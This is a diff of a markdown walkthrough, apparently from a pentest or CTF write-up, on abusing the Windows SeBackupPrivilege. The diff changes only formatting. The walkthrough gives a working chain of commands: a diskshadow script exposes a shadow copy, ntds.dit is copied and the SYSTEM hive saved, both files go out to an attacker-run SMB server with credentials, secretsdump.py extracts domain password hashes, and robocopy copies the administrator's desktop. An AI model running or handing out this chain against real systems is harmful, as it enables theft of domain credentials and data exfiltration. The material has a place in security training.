@@ -15,14 +15,12 @@ import-module .\SeBackupPrivilegeUtils.dll
 
 ### Create a vss.dsh file
 ```markdown
-
 set context persistent nowriters
 set metadata c:\\programdata\\test.cab        
 set verbose on
 add volume c: alias test
 create
 expose %test% z:
-
 ```
 NOTE: c:\\programdata is the writeable path where you i have upload dll and creating a test.cab
 
@@ -40,6 +38,7 @@ diskshadow /s c:\\programdata\\vss.dsh
 
 ### Now you can copy any file 
 copy any file to present dir and then download it to your system
+
 We gonna get ntds.dit and system
 ```markdown
 Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\programdata\\ntds.dit
@@ -51,7 +50,7 @@ reg save HKLM\SYSTEM C:\\programdata\\SYSTEM
 Now we can see that both ntds.dit and SYSTEM files are in our present dir.
 You can also get other sensetive files like SAM, SYSTEM, SECURITY.
 
-Download these files using smb server.
+### Download these files using smb server.
 ```markdown
 smbserver.py k4sth4 . -smb2support -username kt -password kt
 net use \\10.10.x.x\k4sth4 /u:kt kt
@@ -67,10 +66,10 @@ secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
 ```
 
 ### We can also Dump the whole administrator dir into Temp
-```markdow
+```markdown
 robocopy /b C:\\users\\administrator\\desktop C:\\programdata\\temp
 ```
-now we get all the desktop files in temp dir.
+We get all the desktop files in temp dir.
 
 ## Now after doing this CleanUp is necessary
 
